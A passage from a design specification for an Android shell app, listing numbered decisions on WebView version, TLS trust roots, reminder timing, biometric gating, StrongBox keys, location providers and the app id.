3. **The minimum WebView is 120** (§9.1). Decided here: it has every feature used, and a phone that takes WebView updates is far above it. If the owner's phone cannot reach it, `android-shell` records the version and asks.
4. **Trust roots per API level** (§12.6): bundled roots below API 34, the platform's from 34. Decided here for `android-shell` to confirm (SYNC_PLAN.md §6.6 item 7). SYNC.md §7 says "TLS from the OS trust store everywhere"; old phones' stores cannot be updated.
5. **No freshness alarm.** SYNC.md §4.9 offers an optional hourly one; decided here: none, so reminders never compete for the Doze budget (V3-13), and only "fresh on open" is promised.
6. **Reminders fold forward**: a firing posts everything due in the next 9 minutes, so a folded reminder may come up to 9 minutes early. Decided here (R2 §5 says "fold"; early is the safer side of a reminder). Missed reminders within the hour fire at once after a reboot or a late alarm; older ones are dropped. Snooze is 10 minutes. An event's reminder offers only Snooze, because Done does not apply to an event and moving it a day is not what a reminder is for.
7. **Every "auth" call on the phone needs API 30** (§13.2). Ruled S30: the framework offers BIOMETRIC_STRONG without a PIN fallback only from API 30, and the app may use no `androidx.biometric` (§12.4); `device.md` §17 marks these calls "desktops; API 30", so the facade refuses them below.
8. **The way from the page to the native screens** is a Tray button and the panel's button, not the masthead, whose rule is that nothing in it is tappable (phone.html:864-869). Decided here.
9. **`setBlockNetworkLoads(true)` together with the asset loader** is assumed to load the page (V3's notes mark it unverified). Default: `android-shell` tests it first; if the page does not load, it records the finding and a spec-change pull request replaces the setting by the CSP and the 403 interception alone.
10. **StrongBox and the cold start.** The key uses StrongBox when present (§12.5); its unwrap is inside the cold-start budget (§16.2). Default: if a StrongBox phone's measurement misses the budget because of it, `android` records it and asks the owner, rather than dropping StrongBox on its own.
11. **The page caches go entirely in `android`** (A-02): the agenda's first frame then waits for one bridge round trip against the local replica instead of reading a month from storage. Decided here; the cold-start budget checks the cost.
12. **The words** of the sync line (A-03), the notice banner (A-04), the conflict sheet (A-06), the marks (A-07), the panel (§5.8), the notifications (§15) and the error replies (§6.5) are decided here so that tests are exact; `android` may change them only through a spec change.
13. **Location providers** (§6.4.5): `fused` then `network` from API 31, `network` below; coarse only; a last fix up to 5 minutes old is used, as today's page did. Decided here.
14. **The shell keeps the time of the phone's own place** (`own_place_at_ms`), not the place: the place lives only in `device.tdk` (DEV-WX-002). Decided here.
15. **The application id** is `app.taskdeck.phone` (§12.1). Decided here; the owner may change it before the first signed release, never after (an update must keep the id and the certificate).
16. **The echo fixtures** (§6.7) are a new set the fixture generator writes for this spec: 201 one-day snapshots at a pinned clock in UTC. Decided here.
17. **`POST /api/screen` is reachable from the page** (§6.4.7): a script in the page can open a native screen, at most once a second, and the screens act only on the user's taps and, for membership changes, after BIOMETRIC_STRONG. Decided here.
